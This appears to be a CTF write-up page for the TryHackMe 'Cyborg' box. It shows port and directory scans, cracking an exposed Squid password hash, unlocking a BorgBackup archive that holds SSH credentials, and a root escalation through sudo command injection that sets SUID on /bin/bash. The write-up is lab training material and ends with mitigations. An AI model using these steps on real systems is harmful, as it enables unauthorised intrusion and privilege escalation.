@@ -1,0 +1,207 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cyborg — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="A publicly exposed Squid proxy config and password file handed over an md5crypt hash cracked to squidward. That passphrase unlocked a BorgBackup archive…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/cyborg.html">
+<meta property="og:title" content="Cyborg — TryHackMe writeup">
+<meta property="og:description" content="A publicly exposed Squid proxy config and password file handed over an md5crypt hash cracked to squidward. That passphrase unlocked a BorgBackup archive…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/cyborg.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Cyborg — TryHackMe writeup","description":"A publicly exposed Squid proxy config and password file handed over an md5crypt hash cracked to squidward. That passphrase unlocked a BorgBackup archive…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-14","url":"https://thecyberfarhan.github.io/writeups/cyborg.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/cyborg.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>Cyborg</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Easy</span>
+    <span>June 14, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>A publicly exposed Squid proxy config and password file handed over an md5crypt hash cracked to <code>squidward</code>. That passphrase unlocked a BorgBackup archive downloaded from the web server, inside which sat Alex's plaintext credentials. SSH in, find a <code>sudo</code> rule on a backup script that accepts arbitrary command injection via a <code>-c</code> flag, stamp SUID on <code>/bin/bash</code>, drop to root. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">🕷 Feroxbuster</span><span class="chip">🔓 John the Ripper</span><span class="chip">📦 BorgBackup</span><span class="chip">🔐 SSH</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Today's target is <strong>Cyborg</strong> — a box that tells its own story through a shoutbox on the admin page. Alex was "playing around with the squid proxy," decided to give up "like always," and left all the config files lying around. Publicly. On the web server. Including the password file. The backup archive he was so confident was safe contained his credentials in a plaintext note to himself. The sudo rule he probably thought was harmless accepted arbitrary command injection through a getopts flag nobody had thought to audit. Alex is a cautionary tale, and this writeup is a tribute to his contributions to our root shell.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>What a Squid proxy is and why its config files are sensitive</li><li>What BorgBackup is and how passphrase-protected repositories work</li><li>What <code>getopts</code> is in bash and how unsanitised option arguments become command injection</li><li>What SUID on <code>/bin/bash</code> grants and how <code>-p</code> preserves effective UID</li></ul>
+<h2 data-reveal>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<p class="aside">Full-range sweep with RustScan, Nmap for service and version fingerprinting:</p>
+<pre><code>rustscan -a 10.48.163.91 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.2p2 Ubuntu 4ubuntu2.10</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.4.18 (Ubuntu)</td></tr></tbody></table>
+<p>Standard two ports. Apache default page on the root — same signal as Wgel CTF, meaning the content is hiding elsewhere.</p>
+<h3>Web Directory Enumeration</h3>
+<p class="aside">(~3 mins into the box)</p>
+<p class="aside">Feroxbuster with the dirb common wordlist:</p>
+<pre><code>feroxbuster -u http://10.48.163.91/ \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -x php,txt,html</code></pre>
+
+<pre><code># output (relevant hits only)
+301  http://10.48.163.91/admin          # ^^^ admin panel with shoutbox
+200  http://10.48.163.91/admin/admin.html
+200  http://10.48.163.91/admin/archive.tar   # ^^^ 1.5 MB backup archive
+301  http://10.48.163.91/etc
+200  http://10.48.163.91/etc/squid/squid.conf
+200  http://10.48.163.91/etc/squid/passwd    # ^^^ proxy credentials</code></pre>
+<p>Two immediately interesting trees: <code>/admin/</code> with a downloadable archive, and <code>/etc/squid/</code> with the proxy configuration and a password file. Both explored in parallel.</p>
+<h3>Admin Shoutbox — Usernames &amp; Context</h3>
+<p><code>/admin/admin.html</code> hosts an internal shoutbox. Three usernames surface: <strong>Josh</strong>, <strong>Adam</strong>, and <strong>Alex</strong>. Alex's message is the operational gold:</p>
+<blockquote>*"Ok sorry guys i think i messed something up... I was playing around with the squid proxy... all the config files are laying about... i'm not sure how to delete them hope they don't contain any confidential information lol. Other than that i'm pretty sure my backup 'music_archive' is safe just to confirm."*</blockquote>
+<p>Alex has told us exactly what to look at: the Squid config files, and a backup called <code>music_archive</code>. The box is narrating its own attack path.</p>
+<h3>Squid Proxy Credentials</h3>
+<p class="aside">Contents of <code>/etc/squid/passwd</code>:</p>
+<pre><code>music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.</code></pre>
+<p class="aside">Contents of <code>/etc/squid/squid.conf</code> (relevant section):</p>
+<pre><code>auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
+auth_param basic realm Squid Basic Authentication
+acl auth_users proxy_auth REQUIRED
+http_access allow auth_users</code></pre>
+<p>The proxy is configured to authenticate users against <code>passwd</code>. The hash format is <code>$apr1$</code> — Apache's variant of md5crypt, the same format used in <code>.htpasswd</code> files. John the Ripper handles it natively.</p>
+<h2 data-reveal>Foothold</h2>
+<p class="aside">(~10 mins into the box)</p>
+<h3>Hash Cracking — John the Ripper</h3>
+<p>The hash needed to be wrapped in single quotes rather than double quotes to prevent bash from interpreting the <code>$</code> characters as variable expansions — the first attempt with double quotes loaded an empty hash and John reported nothing to crack.</p>
+<p class="aside">Saving the hash correctly with single quotes:</p>
+<pre><code>echo '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' &gt; hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></pre>
+
+<pre><code># output
+squidward        (?)
+1g 0:00:00:00 DONE</code></pre>
+<p>Passphrase: <code>squidward</code>. Appropriate, given the context.</p>
+<h3>BorgBackup Archive Extraction</h3>
+<p>The downloaded <code>archive.tar</code> is not a standard tar archive of files — attempting to unzip it fails and <code>tar -xvf</code> extracts a directory structure containing <code>config</code>, <code>data/</code>, <code>hints.5</code>, <code>index.5</code>, <code>README</code>, and <code>nonce</code>. These are the internal files of a <strong>BorgBackup</strong> repository.</p>
+<p><strong>What is BorgBackup?</strong> An encrypted, deduplicated backup tool. Repositories are opaque directory structures — the actual backed-up data is stored chunked and encrypted inside <code>data/</code>. To read the contents, you need the <code>borg</code> tool and the repository passphrase.</p>
+<p class="aside">Installing BorgBackup and listing the repository contents:</p>
+<pre><code>sudo apt install borgbackup
+borg list ~/home/field/dev/final_archive</code></pre>
+
+<pre><code>Enter passphrase for key /home/farhan/home/field/dev/final_archive:
+# passphrase: squidward
+
+music_archive    Tue, 2020-12-29 19:00:38 [f789ddb6b0ec...]</code></pre>
+<p>One archive named <code>music_archive</code> — exactly what Alex mentioned. The squid proxy passphrase doubles as the Borg repository passphrase. Alex reused it.</p>
+<p class="aside">Extracting the archive:</p>
+<pre><code>mkdir extracted_data &amp;&amp; cd extracted_data
+borg extract ~/home/field/dev/final_archive::music_archive
+# passphrase: squidward</code></pre>
+<p class="aside">Exploring the extracted contents:</p>
+<pre><code>home/alex/Desktop/secret.txt
+home/alex/Documents/note.txt</code></pre>
+<p class="aside">Reading the files:</p>
+<pre><code>cat home/alex/Desktop/secret.txt</code></pre>
+
+<pre><code>shoutout to all the people who have gotten to this stage whoop whoop!</code></pre>
+
+<pre><code>cat home/alex/Documents/note.txt</code></pre>
+
+<pre><code>Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
+
+alex:S3cretP@s3</code></pre>
+<p>Alex wrote his SSH credentials in a plaintext note inside a backup archive. The backup was encrypted, sure — with a passphrase he reused from the publicly exposed proxy config. Full circle.</p>
+<h3>Credentials Found</h3>
+<table><thead><tr><th>Username</th><th>Password</th><th>Where Found</th></tr></thead><tbody><tr><td><code>music_archive</code></td><td><code>squidward</code></td><td>Squid <code>/etc/squid/passwd</code> + John the Ripper</td></tr><tr><td><code>alex</code></td><td><code>S3cretP@s3</code></td><td>BorgBackup archive → <code>note.txt</code></td></tr></tbody></table>
+<h2 data-reveal>Shell / Access</h2>
+<p class="aside">(~20 mins into the box)</p>
+<p class="aside">SSH login as <code>alex</code>:</p>
+<pre><code>ssh alex@10.48.163.91
+# Password: S3cretP@s3</code></pre>
+
+<pre><code>alex@ubuntu:~$ cat user.txt
+flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}</code></pre>
+
+<h2 data-reveal>Escalation</h2>
+<p class="aside">(~22 mins into the box)</p>
+<h3>sudo backup.sh — Argument Injection</h3>
+<p class="aside">Checking sudo permissions:</p>
+<pre><code>sudo -l</code></pre>
+
+<pre><code>User alex may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh</code></pre>
+<p class="aside">Reading the script:</p>
+<pre><code>cat /etc/mp3backups/backup.sh</code></pre>
+<p>The script is owned by <code>alex</code> and readable — the relevant section at the end:</p>
+<pre><code>while getopts c: flag
+do
+    case "${flag}" in
+        c) command=${OPTARG};;
+    esac
+done
+
+# ... backup logic runs first ...
+
+cmd=$($command)
+echo $cmd</code></pre>
+<p><strong>What is happening here?</strong> The script accepts a <code>-c</code> flag via <code>getopts</code> and stores whatever argument is passed into <code>$command</code>. At the end of the script, it evaluates <code>$command</code> directly in a subshell: <code>cmd=$($command)</code>. There is no sanitisation, no allowlist, no restriction on what <code>$command</code> can contain. Any string passed via <code>-c</code> is executed as a shell command — as root, because the entire script runs via <code>sudo</code>.</p>
+<p>This is argument injection via an unvalidated <code>getopts</code> option becoming a shell evaluation.</p>
+<p class="aside">Stamping SUID on <code>/bin/bash</code> via the injection:</p>
+<pre><code>sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"</code></pre>
+<p class="aside">Spawning a root shell with <code>-p</code> to preserve effective UID:</p>
+<pre><code>/bin/bash -p</code></pre>
+
+<pre><code>bash-4.3# id
+uid=1000(alex) gid=1000(alex) euid=0(root) egid=0(root) groups=0(root),...
+bash-4.3# cat /root/root.txt
+flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}</code></pre>
+
+<h2 data-reveal>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong>Feroxbuster</strong> → <code>/etc/squid/passwd</code> exposed → md5crypt hash for <code>music_archive</code></li><li><strong>John the Ripper</strong> cracked <code>$apr1$</code> hash → passphrase <code>squidward</code></li><li><strong><code>archive.tar</code></strong> identified as BorgBackup repository → unlocked with <code>squidward</code></li><li><strong>BorgBackup extraction</strong> → <code>note.txt</code> inside alex's home → <code>alex:S3cretP@s3</code></li><li><strong>SSH as <code>alex</code></strong> → user flag</li><li><strong><code>sudo backup.sh -c "chmod +s /bin/bash"</code></strong> → SUID bash → root shell → root flag</li></ol>
+<h2 data-reveal>Rabbit Holes</h2>
+<h3>Double-Quoted Hash — John Loads Nothing</h3>
+<p>The first <code>john</code> attempt used double quotes around the hash string:</p>
+<pre><code>echo "$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn." &gt; hash.txt</code></pre>
+<p>Bash expanded <code>$apr1</code>, <code>$BpZ</code>, and <code>$F0qqPwHSOG50URuOVQTTn</code> as empty variables, writing a mangled empty string into the file. John reported "No password hashes loaded." Single-quoting the string fixed it immediately. A sharp reminder: always single-quote hash strings containing <code>$</code> when echoing to a file.</p>
+<h3><code>unzip</code> on a <code>.tar</code> File</h3>
+<p>Muscle memory. <code>archive.tar</code> has a <code>.tar</code> extension and <code>unzip</code> refused it immediately with a "not a zipfile" error. <code>tar -xvf</code> was the correct command — but the extracted result wasn't a set of files, it was a BorgBackup repository, requiring a completely different tool to read.</p>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Squid proxy config and password file exposed in webroot</td><td class="sev-critical">Critical</td><td>Never place service configuration files under a web-accessible directory; restrict <code>/etc/</code> paths entirely from web serving</td></tr><tr><td>Weak proxy passphrase (<code>squidward</code>) in rockyou.txt</td><td class="sev-high">High</td><td>Use a long randomly generated passphrase for any authentication credential</td></tr><tr><td>Passphrase reused across Squid proxy and BorgBackup repository</td><td class="sev-high">High</td><td>Never reuse credentials across services; use a password manager</td></tr><tr><td>Plaintext credentials stored in a backup archive</td><td class="sev-high">High</td><td>Never store plaintext passwords anywhere — not in notes, not in backups; use a proper secrets manager</td></tr><tr><td><code>sudo backup.sh</code> with unsanitised <code>-c</code> argument injection</td><td class="sev-critical">Critical</td><td>Validate and restrict all inputs to privileged scripts; if a script must accept arguments, use an allowlist of permitted values — never <code>eval</code> or subshell-execute unsanitised user input</td></tr><tr><td>SUID bit stampable on <code>/bin/bash</code></td><td class="sev-critical">Critical</td><td>The <code>-c</code> injection fix above prevents this; additionally audit SUID binaries regularly and remove unnecessary ones</td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>Credential reuse across services is a force multiplier for attackers — one cracked hash unlocked both the Squid proxy and the BorgBackup repository. Every service should have its own unique, randomly generated credential. When one leaks, the blast radius stays contained to that single service rather than cascading through the entire infrastructure.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>Single-quote hash strings containing <code>$</code> before echoing them to a file — every time, without thinking. Also <code>file archive.tar</code> before trying to extract it, which would have immediately shown "POSIX tar archive" rather than triggering the muscle-memory <code>unzip</code> attempt.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/cyborg_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
